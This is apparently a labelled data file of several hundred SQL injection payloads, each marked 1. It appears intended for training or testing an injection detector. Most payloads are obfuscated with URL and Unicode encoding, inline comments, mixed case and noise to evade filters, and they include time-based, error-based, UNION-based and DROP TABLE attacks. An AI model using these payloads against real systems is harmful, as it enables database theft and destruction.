"'OR%0d%0aEXISTS(SEL/*!*/ECT1FROMusers)----it9i0stguzh7f6k", 1
";DROPTABLE%0d%0ausers;--#xlea7ts97tad6", 1
"1%27%%320AN%44%20substring%28database(),%201,%%3201)%%320%3D%20%27s%27%%320%2d---ujpcz5ltz", 1
";%20sEleCT%20pg_SLeEP(5);%20--#9dskaL6m71d4pzf", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020/**/# more_noise--", 1
"'UNION%0d%0aSELECT%0a1,2,3/**//*!*/AND/**/1>=1--", 1
"' anD 1=cONvert(INt,@@vERsION)--", 1
"1%25u0027%2F%2A%2A%2FAND%2F%2A%2A%2Fsubstring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%2F%2A%2A%2F%3D%2F%2A%2A%2F%25u0027s%25u0027%2F%2A%2A%2F--", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%3Dconvert%28int%2C%40%40version%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27a%27%3D%27a%27--", 1
"1/**/AND%u00201=1%u0020OR%u0020(1)", 1
"1%27%09%09%09%09O/*!*/R%09%09%09%09IF(substring(database(),%09%09%09%091,%09%09%09%091)%20%3D	%27a%27,%09%09%09%09SLEEP(5),%09%09%09%090)%09%09%09%09--#q9nna4", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020----plvd3", 1
"%3B%2F%2A%2112345%2A%2FSELECT%09pg_sleep%285%29%3B%09--", 1
"'Or/*%0A*/'1'='1", 1
"", 1
"1%27%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#94h0efh1tu8qu", 1
"1)%u0020UNIO%4e%u0020%53ELECT%%7500201,dat%61base(),%33--", 1
"admin' OR '1'='1 /*!*/AND 1=1", 1
"test%u0027%u0020OR%u0020%u00271%u0027	IN (1)	%u00271%u0027%u0020--%u0020#osps9kdp1", 1
"%27%20AND%201%3D1%20 /*!*/AND 1=1--%20%23rs9xdo8wwq", 1
"'/**/OR/**/'1'<='1#o9w7if", 1
"1'/**/AN%44/**/substring(data%62ase%28),/**/1,/**/1%29/**/>=/**/'s'%20--", 1
"%27/*!*/UNION SEL%45CT %6eull, null, null -%2d #rurzglipp3dct3x", 1
"1%27%20And%20sUBstrinG(DatABaSE(),%201,%201)%20%3D%20%27s%27%20 AND 'a'='a'--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29----zyekj9qh3bscb", 1
"'/*!*/UNIONSELECTnull,null,/*%0a*/null--/*%0d%0a*/%0a", 1
";/*!12345*/DRoP%09%09%09TabLE%09%09%09uSERs;%09%09%09--", 1
"WAITFOR%%32F%2A%2A%2FDELA%59%2F%2%41%2A%2F%270%%33A0%3%415%27----oo%36x7xve13b", 1
"%u0027%u0020uNION%u0020sElEct%u0020NULL,%u0020nu%6C%6c,%u0020nu%6CL%20--%u0020", 1
"1%27%20%41ND%20substring(datab%61se(),%201,%201)%20%3D%20%27s%27%20%2d-", 1
"'UNION%0aSELECT1,2,3----inugwtjp9ab/*%0a*/", 1
"1))UNION", 1
"SELECT%0a1,database(),3--/*%0a*/", 1
"%u0027%u0020uNiOn%u0020sEleCt%u00201,2,3--", 1
"1)%29/%2a!*/UNION/**/SELECT/**/1,%64atabase%28),3/**/#/**/more%5f%6eoise--", 1
"1'					UNION					SELECT					table_name,					null,					null					FROM					information_schema.tables					--", 1
";/**/drOP/**/TabLE/**/USErs;/**/--", 1
"1'||", 1
"ascii(substring(database(),1,1))>100--", 1
"'/*!12345*/OR1=1--", 1
"%0d%0a", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--/*%0d%0a*/", 1
"'%09%09%09%09OR%09%09%09%09EXISTS(SELECT%09%09%09%091%09%09%09%09FROM%09%09%09%09users)/**/OR 'b'='b'--", 1
"%27OREXISTS%28SELECT%0A1%2F%2A%250d%250a%2A%2FFROMusers%29--%2F%2A%250a%2A%2F", 1
"%27%20OR%20E%58ISTS%28SELECT%20%31%20FROM%20us%65%72s)--", 1
";/*!*/DROP%20TABLE%20users;%20--", 1
"%u0027%u0020AND%u00201=1%u0020%u0020OR%u0020(1)--%u0020", 1
"admin%u0027					O/*!12345*/R					%u00271%u0027%09=%09%u00271", 1
"'/%2a%2112%3345*/OR EXISTS(SEL%45CT 1 FRO%4d users%29--#8pp9mp6tqpofj", 1
"WAITFOR%09%09%09DELAY%09%09%09%270:0:5%27--#pa2d5i1", 1
"1' UNION %53%45L%45CT table_na%6de, null, null F%52OM in%66ormat%69on_schema.tab%6ces --", 1
"1' or AScii(SubstrING(daTaBAsE(), 1, 1)) > 100  -- random_noise--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020 # more_noise--%u0020", 1
"1'UNiONsEleCt", 1
"tabLe_NaMe,NULL,NuLl%0aFrOminfORmAtIon_SCHeMa.tabLes--", 1
"' A%4eD 1=1 --%20", 1
"1'/**/ORascii(substring(database(),1,1))>100/*%0a*/--", 1
"", 1
"1'/%2a*/UNION SELEC%54 table%5fname, nu%6cl, null FROM%20in%66ormation_schem%61.table%73 --", 1
"test'/**/OR/**/'1'IN  (1)'1'/**/--/**/", 1
"1%27UNION%250aSELECTtable_name%2Cnull%2CnullFROMinformation_schema.tables--%250d%250a", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020 -- random_noise--#pfxmh4n0n", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020 # more_noise--", 1
"%31' UNION SELECT table_name, nu%6cl, nul%6c F%52OM %69nformation_schem%61%2et%61bles --", 1
"' And 1in (1)%31%20--", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version())) -- random_noise--#k0t7g95ywwm3v", 1
"'OREXISTS(SELECT1%0aFROM%0ausers)--/*%0a*/", 1
"1'ANDsubstring(database(),%0d%0a1,1)='s'--", 1
"1'ANDsubstring(database(),1,1)%20=%20's'/*%0a*//**/OR 'b'='b'--", 1
"tEst%27%20Or%20%271%27%3d%271%27%20--%20", 1
"admin%27%20OR%20%271%27%3D%271%20#%20more_noise", 1
"%u0027%20%20%20%20%20AND%20%20%20%20%201	=%u00201%20%20%20%20%20--%20%20%20%20%20--oc2754", 1
"%27u%4eioN/*%%30d%0a*/selEct%0d%0a1,2,3--#3McW%34%5912%37UR3l/*%0d%0a*/", 1
"test'OR'1'='1'/*#/*%0d%0a*/more_noise", 1
";    DROP    TABLE    users;    --", 1
"1)) UNION SE%4cEC%54 1,databas%65(%29,3 OR (1)--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#oggo5t48frrrg", 1
"admin'/*!12345*/OR '1'>='1", 1
"1' uNIoN sELEct tAble_NAmE, NuLL, nulL FROm INFoRMAtiON_sCHeMa.taBlEs --", 1
"1'OR/*%0d%0a*/ascii(substring(database(),1,1))>100--%0d%0a--24ml3", 1
"1%2%37%20UN/*%211234%35*/IO%4e%20%53ELECT%2%30t%61ble_name,%2%30null,%2%30null%20FROM%20information_%73chema.tables%20--", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3 -- random_noise--", 1
"%u0027/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)/**/AND/**/%u0027a%u0027IN%u0020(1)%u0027a%u0027--", 1
"' AND extractvalue(1,concat(0x5c,version()))----se4fgmbry1", 1
"' ANd 1=1 --", 1
"' OR 1%3d%31 --", 1
"%27%20UNION%20SELECT%201,2,3 # more_noise--", 1
"' Or EXisTS(selECT 1 FROm usErS)--", 1
"'%20%20%20%2%30UNIO%4e%20%20%20%20SELEC%54%20%20%20%20%31,2,3%2d-", 1
"'/*!*/OR '1'>='1", 1
"%27%20AND%201%3C%3Dconvert%28int%2C%40%40version%29--", 1
"1'UNIONS%45%4cECT%0atabl%65_name,null,%6e%75%6cl", 1
"FROMinformat%69on_schema.tables----9smkijrfw", 1
"%u0027%u0020OR%u0020%u00271%u0027IN (1)%u00271 OR (1)", 1
"admIn%u0027/**/oR/**/%u00271%u0027	= %u00271", 1
";     DROp     tAbLE     USeRs;     --", 1
"%27/**/OR/**/EXISTS(SEL/**/ECT/**/1/**/FROM/**/users)--", 1
"%27%20%20%20UNION%20%20%20SELECT%20%20%20null,%20%20%20null,%20%20%20null%20%20%20--%20%20%20", 1
"teSt%2527%2520OR%2520%25271%2527%253d%25271%2527%2520--%2520--utgjqsp7", 1
"test' OR '1'IN (1)'1'  # more_noise--", 1
"' OR '1'LIKE'1", 1
"%U0027%U0020UNiOn%U0020sELEcT%u0020NULL,%U0020nulL,%u0020nUlL%U0020--%U0020", 1
"AdMiN' || (1=1)'1'='1 # moRe_nOISe", 1
"' OR '1'IN (1)'1#bgysjj", 1
"1%27%20UNION%20SELECT%20t%2561ble_name%2C%20null%2C%20%256eull%20FR%254fM%20in%2566o%2572mation_schema.ta%2562l%2565s%20%252d-", 1
"test' || (1=1)'1'='1' --", 1
"1%27%2F%2A%2A%2FUNionsELEcTtable_NaMe%2Cnull%2CnULl%250d%250aFrOmiNFORMAtiON_sChEMA.tABLEs--", 1
"%27/**/AND extractvalue(1,conc%61t%28%30x5c,versi%6fn()))--", 1
"1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fta%2562le_%256eame%2C%2520null%2C%2F%2A%2A%2Fnu%256cl%2F%2A%2A%2FFROM%2520%2569nformation_s%2563hema.table%2573%2F%2A%2A%2F%20%23%20more_noise--", 1
"'/*!*/OR/**/'1'IN/**/(1)'1", 1
"TesT%27or%250d%250a%271%27%3D%271%27%250a%2F%2A%250d%250a--3ob6ddgg4h7kj38", 1
"'/*!*/AND 1=convert(int,@@version) -- random_noise--", 1
"'/**/aNd/**/1=cONverT(Int,@@VeRsiOn)--", 1
"test' OR '1'='1' /*--aj5szrdy7r7", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29----kt0i3y830vm0", 1
"1%27/**/ORIF(substring(database(),/*%0a*/1,1)%3D%27a%27,SLEEP(5),%0a0)/*%0a*/--", 1
"'/**/UnIon sElEcT 1,2,3----Im91b1n6257XOM", 1
"admin%27%20OR%20%271%27%3D%271/**/-- random_noise", 1
"test%u0027			OR			%u00271%u0027%u0020%u0020=%20%u00271%u0027			/*", 1
"%27%20UN/*!12345*/ION%20SELECT%20null%2C%20null%2C%20null%20--%20", 1
"1)UNION/*%0d%0a*/SELECT%0a1,database(),3--%0a", 1
"te%73t' OR '1'='1' /%2a--khcy0gst2", 1
"TeSt%u0027%u0020%6fr%u0020%u00271%u0027=%u0027%31%u0027%u0020/*%u0020--%u0020random_noise", 1
"1%27%09AND%09substring%28database%28%29%2C%091%2C%091%29%09%09%3D%2509%09%27s%27%09--", 1
"adm%69n%27%20XOR%20%271%27%3D%271", 1
"%27/**/UNION/**/SELECT/**/null,/**/nul%6c,/**/n%75%6cl/**/--/**/", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**/ OR (1)--", 1
"'/*!12345*/OR'1'LIKE'1/*%0a*/OR", 1
"'b'='b'/*%0d%0a*/", 1
"'/*!12345*/UNION SELECT null, null, null  # more_noise--", 1
"1)%20unION%20sELECT%201,DatABase(),3--", 1
"adMin' or '1'='1", 1
"admin%u0027/**/OR%u0020%u00271%u0027=%u00271", 1
"%74est' %4fR '1'='1'%20--", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)/**//*!*/AND/**/1LIKE1--#jrjwd7ta3zyhf", 1
"test'/**/OR/**/'1'='1'/**//*--du5wx5nxhl5q67z", 1
"%27%20UNION%20S%2545%254cECT%201%2C2%2C3-%252d", 1
"%27%20UNIoN%20s%45%4cECT%20NULL,%20Nu%6cL,%20NULL%20--%20", 1
"%25U0027%25U0020OR%25U00201%3D1%25U0020--%25u0020", 1
"admin'OR%20'1'='1%20OR", 1
"(1%29", 1
"%27%2F%2%41%2A%%32FO%52%2F%2A%2A%2F1%3D1%2F%2%41%2A%2F-%2d%2F%2A%2A%2F", 1
"%27AND", 1
"1%3Dconvert(int,@@version)--", 1
"", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020--#f4dgy6", 1
"%u0027%u0020AND%u00201=1%u0020--%u0020#pjf6d", 1
"%31' OR IF(substr%69%6eg%28database%28), 1, 1)%3d'a', SLEEP(5), 0) --", 1
"%u0027OR", 1
"EXISTS(SELECT1FROM%0ausers)--#iaubw0nez0", 1
"1) UNION SELECT 1,database(),3--#qsaumno5s", 1
"WAITFOR %44ELAY '%30:0:5'%2d-", 1
"Test%27%2F%2a%2A%2FOR%2f%2A%2A%2F%271%27%09%3d%09%271%27%2f%2a%2a%2F%2F%2a", 1
"1' AND substring(database(), 1, 1) = 's' ----v1gz0usftsbu3zi", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20%20AND%20%27a%27%3D%27a%27--", 1
"1))%u0020U%4EIon%u0020SE%4Ce%43t%u00201,da%74aBaSE(),3--", 1
"%u0027%09%09%09%09%09AND%09%09%09%09%091%u0020=	1%09%09%09%09%09--%09%09%09%09%09", 1
"1%27%20UNiOn%20SeLECT%20TablE_NamE%2C%20NuLl%2C%20nuLl%20frOM%20infoRMAtion_sCHeMa.taBlEs%20--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271--21p2p99", 1
"'%09%09%09AND%09%09%09extractvalue(1,concat(0x5c,version()))----3724rkt", 1
"1' uNIoN SELect table_Name, nulL, nUlL From INFOrMatIon_sCHeMa.TAblEs --", 1
"' AND 1=convert(int,@@version)----ojp8aa", 1
"WA%49TFOR%20DELAY%20%270%3A0%%33%415%27--", 1
"%27%20OR%201%3D%31%20-%2d%20", 1
";DROP", 1
"TABL%45%0aus%65%72s;--", 1
"; drOP tAbLE uSErS; --", 1
"1'%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%20table_name,%20%20%20%20null,%20%20%20%20null%20%20%20%20FROM%20%20%20%20information_schema.tables%20%20%20%20--", 1
"1'/**/AND substring(database(), 1, 1) = 's'  # more_noise--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20 /*!*/AND 1=1--%20", 1
"'			OR			1%09=  1			--", 1
"1'    OR    asCiI(sUbsTRinG(DAtABaSE(),    1,    1))    >    100    --#udUAq", 1
"%27%20oR%20%271%27%3D%271#3VOCnNb3Zw3", 1
"%u0027		unIoN		sELeCt		NuLL,		NulL,		NuLl		--", 1
"%27%20A/*!*/nD%20EXTrACtvALuE%281%2CcONCAt%280x5C%2cVERSioN%28%29%29%29--#p9Z2Ovt", 1
"1%27%20%7C%7C%20%281LIKE1%29ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"test'||%0d%0a'1'%20= '1'/*%0d%0a*//*/*%0d%0a*/ -- random_noise", 1
"' AND 1=1  # more_noise--", 1
"1'/**/UnIOn/**/SEleC%74/**/tAbLE%5fNA%4dE,/**/NULL,/**/nULl/**/FRom%20iN%66o%72mAtiOn_ScHEma.TableS%20%2d---6n7487", 1
"' OR EXISTS(SELECT 1 FROM users)--#lm97i7cfbdp6e", 1
"'/*!*/UNION SELECT 1,2,3--", 1
"1%20XOR%201%09=  1%20XOR%20(1)", 1
"'/**/Or/**/1=1/**/--/**/#CmHtWMol", 1
"test'	%09%09		OR					'1'/**//**/=%0%39'1'	%09			/*", 1
"%27%20||%20(1%3D1)%271%27%3D%271 AND 'a'='a'#ppwvt", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29        OR        (1)--", 1
";/**/SELECT/**/pg_sleep(5);/**/--#a5yda", 1
"1' || (1=1)if(sUbstRINg(dAtabAse(), 1, 1)='A', SLeeP(5), 0) --#bNH3PH", 1
"1/**/AND/**/1<=1", 1
"t%2565%2573t%27%2F%2A%2A%2FO%252f%2A%21123%25345%2A%2FR%2F%2A%2A%2F%271%27%3D%271%2527%2F%2A%2A%2F--%2F%2A%2A%2F", 1
";/**/DROP/**/TABLE/**/u%73ers;%20-%2d", 1
"' XOR ExtRactvAlUE(1,CoNcAT(0x5c,versioN())) -- RandoM_NOiSe--", 1
"1%27/**/UNIO%4e/**/SELECT/**%2ftable_n%61me,/**%2fnull,/**/%6eul%6c/**/FR%4fM/**/%69n%66ormation_schema.tables/**/--", 1
"'/**/AND/**/1=convert(int,@@version)----vj8e887", 1
"1 And 1LiKe1 # mOre_nOisE", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#0w2gk4o1", 1
"test'OR/*%0a*/'1' = '1'/*%0d%0a*//*#570z9fx3y2a7z", 1
"1%29%29%20UNiOn%20sEleCt%201%2cdATabAsE%28%29%2c3--", 1
"'%09UNioN%09sEleCt%091,2,3----yJVX2PlfD93053y", 1
"1%27%20Or%20IF(SuBStRing(datABASE(),%201,%201)%3D%27A%27,%20SLeEP(5),%200)%20--", 1
"admin'   OR   '1'  =	'1 -- random_noise", 1
"%27%20ANd%201%3DConvert(INT,@@veRsiON)%20OR%20(1)--", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/ -- random_noise--", 1
"%27%20AND%201%3D1%20--%20#0afjifkep2yb8y3", 1
"1'/*!*/AND substring(database(), 1, 1) <= 's' --", 1
"'AND%0d%0aextractvalue(1,concat(0x5c,version()))--/*%0a*/--yl1b7t94gt", 1
"'%20%20UN/*!*/ION%20%20SELECT%20%201,2,3 OR 'b'='b'--", 1
"1%20AND%201%3D1 # more_noise", 1
"TeST' oR '1'='1' -- --kuyyetl864sur", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29IN%20%281%29%27a%27%2C%20SLEEP%285%29%2C%200%29%20%20OR%20%27b%27%3D%27b%27--", 1
"%27uniONSEleCtnuLL%2CNULl%2CnULlAND%27a%27%3D%27A%27--%2F%2A%250d%250a%2A%2F%2F%2A%250D%250A%2A%2F", 1
"1%20AND%201%3D1AND", 1
"'a'='a'--2p951wpf1jl44wo/*%0a*/", 1
"%31))%%320%20UNION%20%20SELECT%20%20%31%2cd%61tabase(),3--", 1
"test' OR '1'='1' -- #t4oakxyyk", 1
"%27/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/----1s3c0fxczd9cn", 1
"%27%09UNION%09SELECT%09%31,2,3%2d-", 1
"'O%52/*%0d%0a*/1=1%20", 1
"--random_noise--/*%0a*/--io6tpio", 1
"1)UNIOn%0aseleCT/*%0d%0a*/1,dATABasE(),3--/*%0a*/", 1
"%u0027%U0020aNd%u0020eXTRACtVaLuE(1,cOncAt(0X5c,vErsiON()))--", 1
"'/**/And 1=coNVERT(iNT,@@vErsIOn) AND 'a'='a'--#r7mxakmq", 1
"1%27%20oR%20aSCii(suBStrInG(DataBaSe(),%201,%201))%20%3e%20100%20--", 1
";/**/sElEcT/**/Pg_sleep(5);/**/--", 1
"' and eXtractvalUe(1,CoNCaT(0x5c,VERsION()))--", 1
"%27%20%26%26%201IN%20%281%29convert%28int%2C%40%40version%29--", 1
"%u0027%20AND%09%09%09%09%091%u0020%u0020>=	1%20--%09%09%09%09%09", 1
"test%27%20OR%20%271%2527%3D%27%2531%27%20--%20%2523kmtrn", 1
"'%09%09%09%09%09UNION%09%09%09%09%09SELECT%09%09%09%09%09null,%09%09%09%09%09null,%09%09%09%09%09null%09%09%09%09%09--%09%09%09%09%09#f3tre4la9b", 1
"%u0027%u0020UNION%u0020%53%45LECT%u0020nul%6c,%u0020null,%u0020null%u0020--%20", 1
"%27%09%09OR%09%09%271%27	%3D%20%20%271", 1
"1'||IF(SUBSTrIng(dATabAse(),1,1)='A',SLeEP(5),0)/*%0A*/#/*%0a*/MorE_nOise--", 1
";/*!*/DROP/**/TABLE/**/users;/**/--", 1
"' || (1=1)'1'='1 or (1)--3El5D9", 1
"1))%20UNION%20SELECT%201,database(),3%20/*!*/AND%201%3D1--", 1
"1%2529%2529%2F%2A%2A%2FU%254eION%2520SELECT%25201%2Cdatabase%28%29%2C3-%252d", 1
"WaiTfor dELaY '0:0:5'----4XsBQCv2V8ne14", 1
"%27%20UNIoN%20select%201%2c2%2c3--", 1
"'/**/UNION/**/SE%4cECT/**/null,%20nu%6cl,%20null/**/--/**/", 1
"1%29%29%2520%2520%2520%2520UNION%2520%2520%2520%2520SELECT%2520%2520%2520%25201%2Cdatabase%28%29%2C3----2wfilgds", 1
"'UNIONSELECTnull,/*%0a*/null,null--", 1
"%3b%20dROp%20TABLe%20usErS%3B%20--", 1
"'%09%09%09XOR%09%09%091	IN (1)  1%09%09%09%09%09%09/*!*/AND%09%09%091	=  1--%09%09%09", 1
"' xor '1'='1--xTD4sPNGd4", 1
"test%u0027OR%u00271%u0027=%u00271%u0027--%0a", 1
"'%20AND/**/1=%31/**/--/**/", 1
"1'      OR      ascii(substring(database(),      1,      1))      >      100      --", 1
"1'UNIONSELECTtable_name,null,null/*%0d%0a*/FROMinformation_schema.tables----lu85akf0yoch", 1
"%3B%20DROP%20TABLE%20users%3B%20/**/--/**/random_noise--", 1
"%31/*!*/xoR 1=1", 1
"1%20AND%201%3D1 XOR 'a'='a'", 1
"%3B%2F%2A%2A%2FSELEct%20Pg_SlEEp%285%29%3B%20--", 1
";DROP/*%0a*/TABLEusers;%0a # more_noise--/*%0a*/", 1
"%U0027/**/and/**/1lIkE1/**/--/**/", 1
"'/*!*/UN%49ON SELECT nul%6c%2c nul%6c, null --", 1
"1'&&%0a(1=1)substring(database(),1,1)=/*%0d%0a*/'s'%0d%0a /*!*/AND 1=1--", 1
"test%27/**/OR/**/'1'>='%31'/**//*--jsm7q8nm8igr3px", 1
"%27AN%44%0A%31%3Dconvert%%32%38int%%32C%40%40vers%69on%29--%2F%2A%250a%2A%%32F%230xgegs4eh", 1
"%31%27%20A%4e%44%20subs%74ring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--#e8mrd1g6o2l", 1
"1)/*!12345*/UNION%20SELECT%201,database(),3--", 1
"'%09%09%09%09A/*!*/ND%09%09%09%091%20=	1%09%09%09%09--%09%09%09%09", 1
"waitFOrdelaY", 1
"'0:0:5'%0Aor(1)--%0a", 1
";/*!12345*/DROPTABLE/*%0d%0a*/users;/*%0d%0a*/--", 1
"--4u9ncthpw63vk", 1
"'O/*!*/R", 1
"'1'>='1/*%0a*/", 1
";/*!*/DROP%u%30020TABLE%%75002%30us%65rs;%u0020--", 1
"1'/*!12345*/AND substring(database(), 1, 1) = 's'  # more_noise--", 1
"'/*!12345*/AND 1=1  || (1)--", 1
"' AND e%78tra%63tvalue(1,concat%280x%35c,version%28)))--", 1
"1)%20U%4eION%%320SEL/*!*/ECT%%3201,database(%29,3--", 1
"WAitfor%20delaY%20%270%3A0%3a5%27--#P8IkidsDInr7On1", 1
"1'/*!*/AND sUBsTrinG(DataBasE(), 1, 1) = 'S' --", 1
"%27/*!*/OR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"%u0027%09AND%091	=%09convert(int,@@version)--", 1
"TEst%27%20or%20%271%27%3D%271%27%20 OR (1)--%20", 1
"'AnD/*%0d%0A%2a/1%3d1%0D%0a%2d-", 1
"", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020 # more_noise--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#sxtr0yri0l", 1
"'					OR					'1'%20=  '1", 1
"test'/*!*/OR '1'='1'  AND 'a'='a'--", 1
"%27%20%20%20%20XOR%20%20%20%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1' Or asCIi(substRIng(DatabaSe(), 1, 1)) > 100 --", 1
"%u0027%u0020%u0020U%4eION%u00%320%u%300%320SELECT%%750020%u00201,2,3%2d-", 1
"'				OR				EXISTS(SELECT				1				FROM				users)--", 1
"wAitFOrdELAY%0A'0:0:5'--#o8eRo2HTWHGM", 1
"WaITfoR          DeLay          '0:0:5'----4q2dDSz", 1
"1%29%20UnIOn%20SEleCT%201%2cDaTABaSe%28%29%2c3--", 1
"'A%4eD%0aextr%61ctvalue(1,concat(0x%35c,%76ersio%6e()))/**/--/**/random_noi%73e--", 1
"", 1
"%u002%37%u0020%55NI%4fN%u0020SELECT%u00201,2,3%2d-", 1
"test%27%u0020%4f%52%u0020%u00271%u0027=%u00271%u0027%u0020%u0020#%u0020more_noise--%u0020", 1
"1) UnioN SElECT 1,DATABase(),3--", 1
"' AND extra%63tv%61lue%281,c%6fncat(0x5c,version%28)))--", 1
"1AND/*%0d%0a*/1=1 # more_noise", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----t6cmw", 1
"' AND extractvalue(1,concat(0x5c,version()))--#w0zw50k1", 1
"'%09%09%09OR%09%09%09EXISTS(SELECT%09%09%091%09%09%09FROM%09%09%09users)--", 1
";     SE%4cE%43T   %20 pg_sleep%285);     ----yo%6e8fbxah", 1
"'UniOnSeLEcTnuLl,nulL,NuLl--%0D%0A%0D%0A", 1
"%27%20Or%20Exists(sELeCt%201%20FrOm%20uSeRs)--", 1
"1%27%20aND%20sUBSTrInG%28datABase%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20--%23nkefo", 1
"1'/*%2a/O%52%2f**/IF(subs%74ring(database(),/*%2a%2f1,/**/1)='a',/**/SLEE%50(5),/**%2f0)/**/--", 1
"%25u0027%25u0020A%2F%2A%2112345%2A%2FND%25u00201%3Dconvert%28int%2C%40%40version%29--", 1
"'UN/*!*/ION%0aSELECT1,2,3--", 1
"1%27%2F%2A%2A%2FXOR%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20OR%20%27b%27%3D%27b%27--", 1
"1))/**/UNION/**/SE%4c%45CT/**/1,databas%65%28),3----3vzyksp", 1
"admin%27%20%20OR%20%20%271%27%20%3D%20%271", 1
"admi%6e'/*!%312345*/OR/**/'1%27IN (1)'1", 1
"WAITF%4fR%u0020DELAY%u0020%u0%30270:0:5%u%3002%37 AND 'a'='a'--", 1
"'UNIONSELECT", 1
"null,/*%0d%0a*/null,null--", 1
"'/**/UNIO%4e SELECT null, %6eull,%20null --%20", 1
"1%u0027%u0020||%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"test'/**/OR/**/'1'='1'/**/--/**/#vbj66p1g1", 1
"'AND%0d%0a1>=convert(int,@@version)--/*%0d%0a*/", 1
"WAItFORdelay%0a'0:0:5'----2wkz1441io6%0a", 1
"1))/**/UNION/**/SELECT/**/1,database(),3 -- random_noise--", 1
"%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2C2%2C3 OR (1)--", 1
"ad%6din' O%52 '1'='1 AND '%61'='a'", 1
"' AND 1=c%6fnve%72t(int,@@ve%72%73ion)--", 1
"1' %4f%52 IF(s%75bstring(database()%2c 1, 1)<='a%27, SLEEP(5), 0) %2d-#zpvcjlpdon610jk", 1
"%2527%2520AND%%325%320extr%61ctv%61l%75e%281%2Cconcat%%3280x5c%2Cversion%28%29%29%29%2d-", 1
"%27%20ANd%20EXtractvaLue%281%2cCONCaT%280X5c%2cVersION%28%29%29%29--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020 -- random_noise--", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/ || (1=1)'b'='b'--/**/", 1
"1%25U0027%25u0020uNion%25u0020Select%25u0020TAbLE_naME%2C%25u0020NulL%2C%25u0020NULL%25U0020fROM%25u0020INforMaTion_sCHemA.TabLEs%25u0020--", 1
"1%27%20uNIOn%20%53elEcT%20tAble_nAM%65,%20Null%2C%%320Nu%6CL%20FroM%20I%6EFORMAt%69ON_schemA.T%61b%6CEs%20--", 1
"%31)%u0020UNION%u0020SELECT%u00201%2cd%61tab%61se(),3--", 1
"admin%25u0027%25u0020OR%25u0020%25u00271%25u0027%2509%3D%20%20%25u00271--d7lrfir", 1
"%31'ANDsubstr%69ng(database()%2c1,%31)/*%0d%0a*/=%27%73'AND'a'='a'--", 1
"%u0027anD1  =	1%0d%0a--", 1
"' AND 1=1  /*!*/AND 1=1-- --5iwmfvx198", 1
"' UnION SeLeCt 1,2,3 /*!*/aND 1=1--", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version())) || 'b'='b'--", 1
"'AND/*%0d%0a*/1=convert(int,@@version)--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20 OR 'b'='b'--", 1
"1 && (1=1)%31=1", 1
"' UNION SELE%43%54 null, null,%20nu%6cl  AND 'a'='a'--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#ath4g2l85wa", 1
"'/*!*/OR%20%20%20%20'1'%09=	'1", 1
";/**/DROP/**/TABLE/**/users;/**/----byz5zbhw195pe9", 1
"1'/*!12345*/XOR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  -- random_noise--", 1
"'/**/A/*!12345*/ND/**/extractval%75%65%281,concat(0x5%63,ve%72sio%6e()))--", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**//**/AND/**/'a'='a'--", 1
"1'/*!*/   and    suBSTrInG(dATABasE(),    1,    1)    %20=%20    'S'    --#fookzzma05e0", 1
"%27%20or%20%271%27LIKE%271", 1
"a%64min%u0027%u0%302%30OR%u002%30%u00271%u0027%3D%u0%30271", 1
